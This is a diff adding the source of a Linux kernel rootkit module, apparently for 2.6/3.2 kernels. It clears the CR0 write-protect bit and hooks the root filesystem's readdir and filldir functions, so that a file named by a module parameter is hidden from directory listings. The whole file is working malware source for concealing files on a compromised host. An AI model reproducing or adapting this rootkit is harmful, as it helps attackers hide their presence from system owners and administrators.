@@ -1,0 +1,169 @@
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/init.h>
+
+//#include <linux/sched.h>
+#include <linux/string.h>
+#include <linux/fs.h>
+#include <linux/mount.h>
+//#include <linux/spinlock.h>
+
+//#include <linux/slab.h> //kmalloc kfree
+//#include <linux/list.h>
+
+#include "my_rootkit.h"
+
+#include <linux/version.h>
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 0)
+#define LINUX26
+#endif
+#ifdef LINUX26
+
+/*code in 3.2 kernel*/
+static char *fname = NULL;
+module_param(fname, charp, 0);
+
+char *root_fs = "/";                /* default FS to hide files */
+
+typedef int (*readdir_t)(struct file *, void *, filldir_t);
+
+struct super_block *root_sb;
+
+readdir_t orig_readdir = NULL;
+filldir_t orig_filldir = NULL;
+
+void setback_cr0(unsigned int val)
+{
+    asm volatile("movl %%eax, %%cr0"
+               :
+               : "a"(val)
+               );
+}
+ 
+unsigned int clear_cr0_save(void)
+{
+	unsigned int cr0 = 0;
+	unsigned int ret;
+	__asm__ __volatile__ ("movl %%cr0, %%eax":"=a"(cr0));
+	ret = cr0;
+
+	cr0 &= 0xfffeffff;
+	asm volatile ("movl %%eax, %%cr0":: "a"(cr0));
+	return ret;
+}
+
+int hack_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
+{
+	int r = 0;
+	
+	if (!root_sb) return 0;
+
+	//printk(KERN_INFO "FileSystem Type: %s\n", root_sb[current->pid%1024]->s_type->name);
+
+	/* Is it hidden ? */
+	if (orig_filldir) {
+		if (name && fname) {
+			if (!strcmp(fname, name)) {
+				return 0;
+			}
+		}
+
+		r = orig_filldir(buf, name, nlen, off, ino, x);
+	}
+	return r;
+}
+int hack_readdir(struct file *fp, void *buf, filldir_t filldir)
+{
+	int r = 0;
+
+	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf || !filldir || !orig_readdir)
+		return 0;
+
+	orig_filldir = filldir;
+	root_sb = fp->f_vfsmnt->mnt_sb;
+	r = orig_readdir(fp, buf, (filldir_t)hack_filldir);
+
+	return r;
+}
+int patch_vfs(const char *p, readdir_t *orig_readdir, readdir_t new_readdir)
+{
+	struct file *filep;
+	
+	printk(KERN_ALERT"patch_vfs: begin\n");
+	
+	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);	
+	if (IS_ERR(filep)) {
+		printk(KERN_INFO "Failed to open file %s\n", p);
+		return -1;
+	}
+	
+	printk(KERN_ALERT"patch_vfs: filep_open ok\n");
+	
+	if (orig_readdir) {
+		*orig_readdir = ((struct file_operations *)(filep->f_op))->readdir;
+	}
+	((struct file_operations *)(filep->f_op))->readdir = new_readdir;
+
+	printk(KERN_ALERT"patch_vfs: change f_op ok\n");
+	
+	filp_close(filep, 0);
+	printk(KERN_ALERT"patch_vfs: end\n");
+	return 0;
+}
+int unpatch_vfs(const char *p, readdir_t orig_readdir)
+{
+	struct file *filep;
+	
+	printk(KERN_ALERT"unpatch_vfs: begin\n");
+	
+	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
+	if (IS_ERR(filep)) {
+		return -1;
+	}
+	
+	printk(KERN_ALERT"unpatch_vfs: filep_open ok\n");
+	
+	if (orig_readdir)
+		((struct file_operations *)(filep->f_op))->readdir = orig_readdir;
+
+	printk(KERN_ALERT"unpatch_vfs: change f_op ok\n");
+	
+	filp_close(filep, 0);
+	printk(KERN_ALERT"unpatch_vfs: end\n");
+	return 0;
+}
+//Initialize the module
+int my_rootkit_init(void)
+{
+	unsigned int cr0;
+	
+	my_rootkit_debug(KERN_ALERT "Begin in init_module\n");
+
+	cr0 = clear_cr0_save();
+
+	if (-1 == patch_vfs(root_fs, &orig_readdir, hack_readdir))
+		my_rootkit_debug(KERN_DEBUG "Failed to patch_vfs\n");		
+	setback_cr0(cr0);
+	
+	my_rootkit_debug(KERN_ALERT "End in init_module\n");
+	return 0;
+}
+//Exit the module
+void my_rootkit_exit(void)
+{
+	unsigned int cr0;
+	my_rootkit_debug(KERN_ALERT "Begin in cleanup_module\n");
+
+	cr0 = clear_cr0_save();
+	if (-1 == unpatch_vfs(root_fs, orig_readdir))
+		my_rootkit_debug(KERN_DEBUG "Failed to unpatch_vfs\n");
+	setback_cr0(cr0);
+	my_rootkit_debug(KERN_ALERT "End in cleanup_module\n");
+}
+MODULE_AUTHOR("ChHuWaLi");
+MODULE_LICENSE("Dual BSD/GPL");
+module_init(my_rootkit_init);
+module_exit(my_rootkit_exit);
+#else
+/*code in 2.4 kernel */
+#endif
